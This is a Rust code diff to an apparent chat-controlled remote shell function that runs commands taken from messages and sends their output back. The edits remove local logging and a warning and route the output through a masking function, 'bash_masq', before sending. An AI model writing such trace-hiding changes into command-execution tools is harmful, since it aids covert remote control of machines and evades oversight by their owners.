@@ -1,4 +1,4 @@
-use crate::{MainConf, RMessage, send};
+use crate::{MainConf, RMessage, send, bash_masq, rev_send};
 use std::process::Command;
 pub async fn shell_main(details: MainConf, message: RMessage) {
 
@@ -47,9 +47,11 @@ pub async fn shell_main(details: MainConf, message: RMessage) {
 pub async fn bash_exec(input: Vec<&str>, details: MainConf, message: RMessage) {
 
 
-    println!("WARN: bashexec");
 
-    let mut newmer = "";
+
+
+    // shell
+
 
     let mut com = Command::new(input[1]);
 
@@ -67,8 +69,10 @@ pub async fn bash_exec(input: Vec<&str>, details: MainConf, message: RMessage) {
     let out = format!("{}{}", String::from_utf8_lossy(&stdout), String::from_utf8_lossy(&stderr));
 
     if out.chars().count() <= 2000 {
-        println!("{out}");
-        send(details.auth, message, out).await
+        
+        //send(details.auth, message, out).await
+
+        rev_send(details.auth, message, bash_masq(out).await).await
 
     }else {
 
@@ -76,21 +80,9 @@ pub async fn bash_exec(input: Vec<&str>, details: MainConf, message: RMessage) {
         let out_vec = out.split('\n').collect::<Vec<&str>>();
 
         for x in 0..out_vec.len() {
-            println!("{}", out_vec[x]);
             send(details.auth.clone(), message.clone(), out_vec[x].to_string()).await
         };
     };
-
-    //let out_vec = out.split('\n').collect::<Vec<&str>>();
-
-
-    //println!("{}", out_vec.len());
-
-    //for x in 0..out_vec.len()
-    
- //   println!("{:#?}", com);
-
-
 
 
 }
